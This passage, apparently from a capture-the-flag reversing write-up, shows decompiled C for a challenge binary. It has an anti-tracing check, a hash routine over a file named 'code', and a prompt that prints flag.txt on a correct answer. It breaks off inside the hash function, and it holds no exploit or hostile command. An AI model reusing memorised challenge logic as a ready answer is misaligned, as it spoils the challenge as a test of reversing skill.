class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Do not trace me!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  s = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v7 = sub_BFA();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  stream = fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;code&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;rb&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !stream )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;Could not open file code!\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x1A&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fseek(stream, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = ftell(stream);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fseek(stream, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( fread(ptr, size, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, stream) != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;Error reading file code\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size_4 = sub_C31(v7, size, (__int64)ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your number is %u\n&amp;quot;&lt;/span&gt;, size_4);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your answer: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v6);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = sub_C31(v6, size, (__int64)ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size_4 == v5 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Congrats!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(s, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    stream = fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;flag.txt&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;rb&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fgets((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)s, &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;, stream);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;((&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Thanks for coming!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;sub_C31&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size, __int64 ptr)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 v7; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 v8; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 v9; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 v10; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 v11; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v12; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v13; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-1Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v14; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v15; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v16; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v17; &lt;span class=&#34;comment&#34;&gt;// [rsp+24h] [rbp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v17 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v16 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v15 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v14 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v13 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; size; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v7 = *(_BYTE *)(i + ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (v7 &amp;amp; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      a1 ^= dword_202020[v13];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v13 = ((_BYTE)v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v8 = v7 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v3 = v8 &amp;amp; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v15 = dword_202020[v13] &amp;amp; &lt;span class=&#34;number&#34;&gt;0xAABBCCDD&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v13 = ((_BYTE)v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v9 = v8 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      a1 += v14 + v15;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v15 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v14 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v9 = v8 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v14 = dword_202020[v13] | &lt;span class=&#34;number&#34;&gt;0xABCDABCD&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v13 = ((_BYTE)v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v9 = v8 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (v9 &amp;amp; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      a1 = ~a1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v10 = v9 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (v10 &amp;amp; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      a1 ^= (((a1 &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ a1) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (a1 &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v11 = v10 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v4 = v11 &amp;amp; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 == &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v17 = dword_202020[v13] - &lt;span class=&#34;number&#34;&gt;539034144&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v13 = ((_BYTE)v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v12 = v11 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 == &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      a1 += v16 + v17;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v17 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v16 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v12 = v11 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v16 = &lt;span class=&#34;number&#34;&gt;539034132&lt;/span&gt; * 